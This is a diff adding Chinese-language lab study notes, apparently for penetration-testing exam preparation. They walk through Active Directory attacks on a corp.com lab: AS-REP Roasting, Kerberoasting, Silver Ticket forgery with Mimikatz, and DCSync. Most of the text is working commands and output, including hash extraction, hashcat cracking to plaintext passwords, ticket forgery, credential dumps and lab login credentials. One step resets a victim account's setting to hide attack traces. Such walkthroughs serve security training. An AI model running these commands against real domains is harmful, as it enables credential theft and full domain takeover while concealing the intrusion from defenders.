@@ -1875,3 +1875,555 @@ Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop
 >```
 
 ### AS-REP Roasting
+在 Kerberos 認證過程 中，當用戶發送 AS-REQ（Authentication Server Request） 給 Doamin Cotroller 進行身份驗證時，預先驗證（[Kerberos preauthentication](https://learn.microsoft.com/en-us/archive/technet-wiki/23559.kerberos-pre-authentication-why-it-should-not-be-disabled)） 會防止攻擊者發送偽造的 AS-REQ 來進行密碼爆破。\
+但如果 "Do not require Kerberos preauthentication" 選項啟用了，attacker 可以代表任何 AD 使用者向 DC 發送 AS-REQ，然後離線破解其加密部分來取得密碼。
+>[!Note]
+>AS-REP Roasting 攻擊流程：
+>- 攻擊者發送 AS-REQ（不需密碼）：請求 DC 返回 AS-REP。
+>- DC 返回 AS-REP：其中包含 TGT（Ticket Granting Ticket）以及密碼雜湊值（AS-REP Hash）。
+>- 擷取 AS-REP Hash，使用 Hashcat 進行 離線破解，以獲取明文密碼。
+
+#### 1. 使用 Kali 進行 AS-REP Roasting
+透過 `impacket-GetNPUsers` 來執行 AS-REP Roasting\
+使用上章節中，取得的 `pete`/`Nexus123!`執行
+```
+┌──(chw㉿CHW)-[~]
+└─$ impacket-GetNPUsers -dc-ip 192.168.181.70  -request -outputfile hashes.asreproast corp.com/pete
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
+----  ----------------------------------------  --------------------------  --------------------------  --------
+dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2025-03-12 02:57:28.456885  0x410200 
+
+$krb5asrep$23$dave@CORP.COM:693a3d75a0b29dc937dfd4fbf165ba73$75c9a64596b10b6a2b85ff036462f1f72aae8af73d5c8e01621a829329095f6a4862123d3a1a17b2879c645745335cf0d37d2f654550a10d46b960499d5a766e37daa26787e9e4860ebf97641947f447c5f1c76449cdd63f812171b4e2e88df7414c48959c6bb83a6f5f98fe8eda87a74f78c7481a34e32496ef04590bd4b30be7727691f76737e77a9d334ba6b6830beb97ae3a48006fa7a9a9a3fb62cecb5b3a0536eee203ec33162fae27a447ebc296eafb0b9cdbaa18478d8d1afcac20665b8ae32cde61d19f3b7094ab0d829c6ab58afbd9ebb93d9f3d1210229aba178bc8238773
+```
+>`-dc-ip`：指定 Domain Controller 的 IP\
+`-request`：請求 AS-REP\
+`-outputfile`：將取得的雜湊值儲存至 hashes.asreproast 以便破解。
+`corp.com/pete`：目標 Domain 和 username
+>> dave 帳戶選項不需要啟用 Kerberos preauthentication\
+>> (可以爆破)
+
+#### 1-1 使用 Hashcat 破解 AS-REP Hash
+查詢 Hashcat 模式
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat --help | grep -i "Kerberos"
+  ...
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+```
+> AS-REP 使用 18200 Mode
+
+開始破解 AS-REP Hash
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+[sudo] password for chw: 
+hashcat (v6.2.6) starting
+
+...
+
+$krb5asrep$23$dave@CORP.COM:693a3d75a0b29dc937dfd4fbf165ba73$75c9a64596b10b6a2b85ff036462f1f72aae8af73d5c8e01621a829329095f6a4862123d3a1a17b2879c645745335cf0d37d2f654550a10d46b960499d5a766e37daa26787e9e4860ebf97641947f447c5f1c76449cdd63f812171b4e2e88df7414c48959c6bb83a6f5f98fe8eda87a74f78c7481a34e32496ef04590bd4b30be7727691f76737e77a9d334ba6b6830beb97ae3a48006fa7a9a9a3fb62cecb5b3a0536eee203ec33162fae27a447ebc296eafb0b9cdbaa18478d8d1afcac20665b8ae32cde61d19f3b7094ab0d829c6ab58afbd9ebb93d9f3d1210229aba178bc8238773:Flowers1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$dave@CORP.COM:693a3d75a0b29dc937dfd4f...238773
+...
+```
+> `-m 18200`：指定 AS-REP 的破解模式\
+`hashes.asreproast`：爆破的雜湊值目標\
+`/usr/share/wordlists/rockyou.txt`：使用 rockyou.txt 字典破解\
+`-r best64.rule`：應用 密碼變化規則（rules）\
+`--force`：強制運行（避免記憶體不足問題）
+>> 破解 dave 的密碼: `Flowers1`
+
+#### 2. 在 Windows 上使用 Rubeus 進行 AS-REP Roasting
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
+```
+在 Windows 上使用 `Rubeus.exe` 來執行 AS-REP Roasting
+```
+PS C:\Users\jeff> cd C:\Tools\
+PS C:\Tools> .\Rubeus.exe asreproast /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : corp.com
+
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+[*] SamAccountName         : dave
+[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+[*] Using domain controller: DC1.corp.com (192.168.181.70)
+[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$dave@corp.com:D5ADB48036691D9D977925CE12B7B7CA$9A913D14714D6457B01F51D613FEB6CC2E8CFD88D1DF0B920416BA3F60137408F59F5BCD062BC267F8D8FF47F2F529BC8721A156AD3CF5E05D47A663473DECAB955C3D24E29DA09A659CB96839FECA810CF6938F8E8AE98B5116C85CC36A454D7E465B82F600276010A618CBB1EC36509DB234837B83C3AE6BE117AC9F204F3F2A91D2C3A4577E89596F4A4EEB6A7879F7A1D9D803422C967483632E5FCC946E7CDAB5C1C1CC2791F77D0C741F039739B6D6092053EF1CAB73E4C2D327B08CF846886F6CDBC81E7BB1AB991F840C8B8CB0FFE7EAC30E7B73014C6F614747E0AC31AE9AC0
+```
+>`asreproast`: Rubeus 的一個子命令，專門用來執行 AS-REP Roasting\
+`/nowrap`: 防止換行，讓輸出的 AS-REP Hash 保持在同一行
+>> 確認 dave 啟用了 "Do not require Kerberos preauthentication"
+
+#### 2-1 複製 Hash 回 Kali，使用 Hashcat 破解
+```
+┌──(chw㉿CHW)-[~]
+└─$ vi hashes.asreproast2 
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+#### - 透過 PowerView 找出無需 Kerberos preauthentication 的帳戶
+- Windows
+```
+PS C:\Tools> powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Tools> . .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -PreauthNotRequired
+
+
+logoncount            : 65535
+badpasswordtime       : 10/18/2022 8:05:18 PM
+distinguishedname     : CN=dave,CN=Users,DC=corp,DC=com
+objectclass           : {top, person, organizationalPerson, user}
+lastlogontimestamp    : 3/11/2025 11:37:28 PM
+name                  : dave
+objectsid             : S-1-5-21-1987370270-658905905-1781884369-1103
+samaccountname        : dave
+codepage              : 0
+samaccounttype        : USER_OBJECT
+```
+- Kali
+```
+impacket-GetNPUsers corp.com/ -dc-ip 192.168.181.70
+```
+#### 3. 進階攻擊：Targeted AS-REP Roasting
+如果無法找到啟用了 "Do not require Kerberos preauthentication" 的帳戶，但我們擁有某個用戶的 GenericWrite 或 GenericAll 權限，可以手動修改其 UserAccountControl 來啟用此選項，然後對該帳戶執行 AS-REP Roasting。
+- 啟用 AS-REP Roasting
+```
+Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='4194304'}
+```
+> 將 `victim` user 的 UserAccountControl 設為 `4194304` 以禁用 Kerberos 預先驗證
+- 破解密碼後還原設定
+```
+Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='512'}
+```
+>  將 `victim` 的 UserAccountControl 設回 `512`（預設值）以掩蓋攻擊痕跡
+
+### Kerberoasting
+Kerberoasting 是一種針對 Kerberos 認證機制 的攻擊方法，目標是從 AD 取得 Service Principal Name (SPN) Service Ticket (TGS-REP) 並破解密碼。\
+透過這種方法可以：\
+獲取特定服務帳號的 Ticket，這些 Ticket 是用該帳戶的密碼 hash\
+離線破解該 Ticket，從而還原明文密碼。
+>[!Note]Key Note:
+>- Kerberos 預設不驗證請求者的權限，所以任何 已驗證的用戶 都可以請求 TGS Ticket。
+>- TGS Ticket 是使用 SPN 帳戶的密碼 Hash，如果密碼較弱，就可以通過 Hashcat 進行破解。
+>- 若 SPN 帳戶擁有高權限（如 Domain Admin 權限），破解密碼後即可獲取更高的存取權限。
+
+如何使用 Rubeus (Windows) 和 impacket-GetUserSPNs (Linux) 來執行 Kerberoasting，然後使用 Hashcat 破解 ticket。
+
+#### 1. Windows：使用 Rubeus 進行 Kerberoasting
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
+```
+(Powershell)
+```
+PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : corp.com
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : iis_service
+[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
+[*] ServicePrincipalName   : HTTP/web04.corp.com:80
+[*] PwdLastSet             : 9/7/2022 5:38:43 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Tools\hashes.kerberoast
+
+[*] Roasted hashes written to : C:\Tools\hashes.kerberoast
+```
+> `kerberoast`：執行 Kerberoasting 攻擊\
+`/outfile:hashes.kerberoast`：將獲取的 TGS ticket (TGS-REP Hash) 存儲到 hashes.kerberoast 檔案中。
+>> 發現 `iis_service` 這個帳戶 可被 Kerberoasting，並且我們已經成功提取了它的 TGS-REP ticket
+
+#### 1-1 複製 Hash 回 Kali，使用 Hashcat 破解
+```
+kali@kali:~$ cat hashes.kerberoast
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
+...
+
+kali@kali:~$ hashcat --help | grep -i "Kerberos"         
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+```
+> Mode: 13100
+
+開始破解 TGS-REP Hash:
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
+...
+d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
+...
+```
+> iis_service/ `Strawberry1`
+
+#### 2. Linux：使用 impacket-GetUserSPNs 進行 Kerberoasting
+使用 impacket-GetUserSPNs 來執行
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.181.70 corp.com/pete
+[sudo] password for chw: 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
+----------------------  -----------  --------  --------------------------  --------------------------  -------------
+HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$6da81cd1a3d459c0d7c1bada07f6414a$7716d53e2abdecf8c7c76790c7065a2ab685f7391909f9a8d5676aea56b9616be1a0b6eef2b4e442f02349ce91d89036219cbb18dd1333c504ba51dea51e9d7e7175fa2ca0a0c5c65511b11f559018b1fb0f4cce2a05ffa3b106cf8fc570581edbc1d5de35c5c0f2eeaf6df5eb574760e023d2ca0f9f2994804b2ebd692367fbb279f1388635f3e1fd2498b9bf7eed113bd2bf6a11f4205a31616d7605941f2f9ac4b220dad98feea37567e857f732e5ae65dee5b41a0f5e81bbccec3e10bcf40633a5e3ca7bff9c4a7bd46ca72df1bd65009cadf5517e5f8a43b24e9741a6fba609f982c7374e83aa5accae99fcceccf1cdd498ca0bf997847581079ae56c2deffcb47cc8a890e977cfa0c5ff3221597981350bfbdc2f18badf0fc78fa5f339c50bd9d65a6bca69bcb839a43ffdda39789767296f7d8cc6a5ae6abc32470b6bf2ea937a83da95863edd098c4be518612a67c522e1f4f652bf12292d62703ef27d7c910446f211862ddd6bf04f3c0eca4f235c4553f2c4d4a4fe4fa5fb6c284dd60270dbbd732e5a72b29d189674aaa7b17d95222c0638e5b5ec7d261cca03a76bcab1bccf26240286044f797169e4e7dca41f4ceb5d15935f166dfb72f53a6c57e12ee04376799b934d27bba9e7028d3a4777423483aded40ece9fd62b2c9e3bc295b5b01ae37e820c3fd35728ef3d32631c4984dbd5efd21380854ef82b5292af747ed2bb9d5270e223b81fa7d165161e9cbeeea72df256f22485c1d078883050869f4111fe885d43a1cdd308cc0844fd7088b195ff88ffff48c4b7086a75c811bcfb9ffbb53459f6b09655d859765c9768ec2a4a73a3f35b46988deb5283e1661ed234baf036deee8b06e432fa400f5974553e692e923f72937b04872c5f77c0f237928ca283fe397306911f003d49cc449c556b0e20f450e187216f752efd8074cf6828a2d732228e94e00cb22b0eeadbbae4862b129e5193696de8696eddee19337967bcec74ee592e5e13e25c58dd3fd927e1da0778a476356fffc855e64cff65df2f48df20c831eb01ea225ef7c62e3a53d566e7f5e70e14dcb2cf9b52cae24f32055942091fbcaa84cbb2d1485bec69f5a627e5c19112a5c9d7c6394c9a7b9e64ff8c438d49c6a6798a147626ca1b5ed4bdfab3dbec77cd69af5d736901294a02f8d03fd0b1089b00c82c3b421245e29970adf7d3b0aa81f0ec551c1214bc59152a4571dec1cfae5bbae4baa7f005093c5e3dc212b9aca75701128cec199fc65b15d150eef975dceb417a1ca50cefe244ac6373b3b8750402239813d8d593b0d0dd304318c4b4a4ab477435bb2d144d84b01bc1d6a1b19f421
+```
+> `-request`：要求獲取 SPN 服務帳戶的 TGS-REP ticket\
+`-dc-ip 192.168.50.70`：指定 Domain Controller 的 IP\
+`corp.com/pete`：使用 pete 這個用戶的身份來執行攻擊
+>> 成功獲取 `iis_service` 帳戶的 TGS-REP ticket
+
+#### 2-1 使用 Hashcat 破解 TGS-REP Hash
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+### Silver Tickets
+在上一章節，取得並破解了 TGS-REP Hash 來檢索 SPN 的明文密碼，接著需要偽造自己的 service tickets。
+
+Silver Ticket 是一種針對 Kerberos 認證機制 的攻擊技術，利用已知的 Service Principal Name (SPN) 服務帳戶的 NTLM Hash，偽造 Kerberos Service Ticket (TGS) 來繞過身份驗證並直接存取特定服務。
+>[!Note]
+>Silver Ticket attack 概念：
+>1. Kerberos Service Ticket (TGS) 是由 服務帳戶的 NTLM Hash 加密，如果攻擊者知道這個 hash 值，就可以偽造 TGS，直接存取該 SPN 服務。
+>2. 應用程式通常不會驗證 TGS 的完整性，因為它們假設 TGS 是由 DC 發出的。
+>3. 透過 偽造的 TGS (Silver Ticket)：
+>- 任意指定身份 (例如：管理員)
+>- 存取目標服務 (如 SMB、HTTP、SQL Server)
+>- 繞過 Active Directory 驗證，不需要與 DC 交互
+>4. PAC ([Privileged Account Certificate](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962)) 驗證：
+>- PAC 是一種額外的安全驗證機制，允許服務驗證 TGS 是否由 DC 簽發。
+>- 大多數應用程式不會啟用 PAC 驗證，因此 Silver Ticket 攻擊通常可以成功。
+
+當前已取得 iis_service 帳戶的 TGS-REP ticket，將建立一張 Silver Tickets 來存取 HTTP SPN 資源
+>[!Important]
+>需要收集以下三個資訊來創建 Silver Tickets：
+>- SPN password hash
+>- Domain SID
+>- Target SPN
+
+#### 1. 確認目前使用者無法存取 SPN
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
+```
+(Powershell)
+```
+PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
+iwr : Server Error
+401 - Unauthorized: Access is denied due to invalid credentials.
+```
+> 確認 jeff 無法存取該網頁(web04)
+
+#### 2. 取得 SPN 服務帳戶的 NTLM hash
+利用 Mimikatz 提取 iis_service 服務帳戶的 NTLM Hash
+```
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1147751 (00000000:00118367)
+Session           : Service from 0
+User Name         : iis_service
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/14/2022 4:52:14 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
+         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
+...
+```
+> iis_service NTLM Hash: `4d28cf5252d39971419580a51484ca09`
+
+#### 3. 取得 Domain SID
+使用 whoami /user 來獲取網域 SID (不包含 RID)
+```
+PS C:\Users\jeff> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
+```
+> 網域 SID 為 `S-1-5-21-1987370270-658905905-1781884369`
+
+#### 4. 偽造 Silver Ticket
+已收集三個必要資訊：
+- SPN password hash: `4d28cf5252d39971419580a51484ca09`
+- Domain SID: `S-1-5-21-1987370270-658905905-1781884369`
+- Target SPN: `HTTP/web04.corp.com`
+
+使用 Mimikatz 來偽造 Silver Ticket
+```
+mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+User      : jeffadmin
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
+Service   : http
+Target    : web04.corp.com
+Lifetime  : 3/12/2025 1:45:25 AM ; 3/10/2035 1:45:25 AM ; 3/10/2035 1:45:25 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
+```
+>`/sid`:：指定 Domain SID\
+>`/domain`:：目標網域名稱\
+>`/ptt`：直接注入 ticket 到記憶體\
+>`/target`:：目標 SPN 伺服器\
+>`/service`:：目標 SPN 類型 (http)\
+>`/rc4`:：目標 SPN 服務帳戶的 NTLM Hash\
+>`/user`:：設定偽造票據中的使用者 (可隨意指定)
+>>  成功偽造 Silver Ticket 並載入記憶體
+
+#### 5. 確認偽造的 Kerberos Ticket
+可以使用 `klist` 檢查目前的 Kerberos ticket
+```
+PS C:\Tools> klist
+
+Current LogonId is 0:0x1052fe
+
+Cached Tickets: (1)
+
+#0>     Client: jeffadmin @ corp.com
+        Server: http/web04.corp.com @ corp.com
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 3/12/2025 1:45:25 (local)
+        End Time:   3/10/2035 1:45:25 (local)
+        Renew Time: 3/10/2035 1:45:25 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+> 已將jeffadmin 存取 http/web04.corp.com 的 Silver Ticket 提交至目前 session，成功注入記憶體，可用於存取目標 SPN。
+
+#### 6. 使用 Silver Ticket 存取目標 Web 伺服器
+再次使用 iwr 來嘗試存取 web04，但這次會使用我們偽造的 Kerberos ticket
+```
+PS C:\Tools> iwr -UseDefaultCredentials http://web04
+
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+                    <html xmlns="http://www.w3.org/1999/xhtml">
+                    <head>
+                    <meta http-equiv="Content-Type" cont...
+RawContent        : HTTP/1.1 200 OK
+                    Persistent-Auth: true
+                    Accept-Ranges: bytes
+                    Content-Length: 759
+                    Content-Type: text/html
+                    Date: Wed, 12 Mar 2025 08:57:25 GMT
+                    ETag: "57a345f2993db1:0"
+                    Last-Modified: Wed, 12 Mar 20...
+Forms             : {}
+Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 759], [Content-Type,
+                    text/html]...}
+Images            : {@{innerHTML=; innerText=; outerHTML=<IMG alt=IIS src="iisstart.png" width=960 height=600>;
+                    outerText=; tagName=IMG; alt=IIS; src=iisstart.png; width=960; height=600}}
+InputFields       : {}
+Links             : {@{innerHTML=<IMG alt=IIS src="iisstart.png" width=960 height=600>; innerText=; outerHTML=<A
+                    href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><IMG alt=IIS
+                    src="iisstart.png" width=960 height=600></A>; outerText=; tagName=A;
+                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
+ParsedHtml        : System.__ComObject
+RawContentLength  : 759
+```
+>  成功繞過身份驗證，存取 Web Server
+
+Microsoft 在 2022 年 10 月 11 日的安全更新，針對 Silver Ticket 和 Golden Ticket 攻擊 進行了防禦加強，主要是透過 更新 [PAC](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041) (Privileged Account Certificate) 結構 來防止濫用。\
+之前，attacker 可以偽造任何使用者的 TGS ticket，甚至創建 AD 裡根本不存在的帳戶 來登入 SPN 服務。在更新後，只有 AD 真實存在的使用者 才能獲得有效的 TGS ticket。
+
+### Domain Controller Synchronization
+DCSync 攻擊是一種強大的 Active Directory (AD) 認證攻擊技術，允許攻擊者偽裝成 Domain Controller，並請求 DC 同步使用者帳戶的密碼雜湊 (NTLM Hash)。\
+>[!Note]
+>**DCSync 攻擊流程**:
+>1. AD 網域的多個 DC 之間需要進行同步
+>- [Directory Replication Service (DRS) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN) 負責讓 DC 之間進行資料同步，確保所有使用者帳戶、群組、權限等資訊保持一致。
+>- DC 會透過 [IDL_DRSGetNCChanges API](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) 來請求更新。
+>2. DC 不會檢查請求的來源，只會檢查權限
+>- DC 並不會確認請求來自合法的網域控制器，只會檢查請求者是否有足夠的權限。
+>- 只要擁有 `Replicating Directory Changes`、`Replicating Directory Changes All`、`Replicating Directory Changes in Filtered Set` 這些權限，就能請求同步資料。
+>- 預設情況下，這些權限只有 Domain Admins、Enterprise Admins、Administrators 群組的成員擁有。
+
+>[!Important]
+>1. 如果攻擊者取得了這些群組的帳號或擁有這些權限的帳號，就能使用 Mimikatz 或 Impacket 的 secretsdump 工具來發起 [DCSync](https://adsecurity.org/?p=2398#MimikatzDCSync) 攻擊。
+>2. 透過 DCSync，攻擊者可以 假裝成 DC，並要求同步特定使用者的密碼哈希值。
+>3. 成功後，攻擊者就能取得該使用者的 NTLM Hash，進一步進行 離線破解 或 Pass-the-Hash (PTH) 攻擊，直接使用 Hash 進行身份驗證。
+
+#### 1. Windows - 使用 Mimikatz
+jeffadmin 是 Domain Admins group 的 member
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.181.75
+```
+讓 Mimikatz 透過 DCSync 攻擊請求 corp.com 網域的 dave 帳戶密碼 Hash
+```
+C:\Tools>.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:corp\dave
+[DC] 'corp.com' will be the domain
+[DC] 'DC1.corp.com' will be the DC server
+[DC] 'corp\dave' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : dave
+
+** SAM ACCOUNT **
+
+SAM Username         : dave
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 9:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
+    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
+    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
+```
+>`lsadump::dcsync`: Mimikatz 的 DCSync 模組，用來執行 目錄同步攻擊\
+`/user:corp\dave`: 指定目標使用者 dave（corp.com 網域下）
+>> dave user credentials: `08d7a47a6f9f66b97b1bae4178747494`
+
+#### 1-1 Hashct 爆破
+NTLM mode: 1000
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+08d7a47a6f9f66b97b1bae4178747494:Flowers1              
+...
+```
+
+#### 2. Linux - 使用 Impacket
+透過 Linux 直接請求 DC 同步 dave 的密碼 Hash\
+擁有 Domain Admin 權限的帳號 (如 jeffadmin) 才會成功
+```
+┌──(chw㉿CHW)-[~]
+└─$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.181.70
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
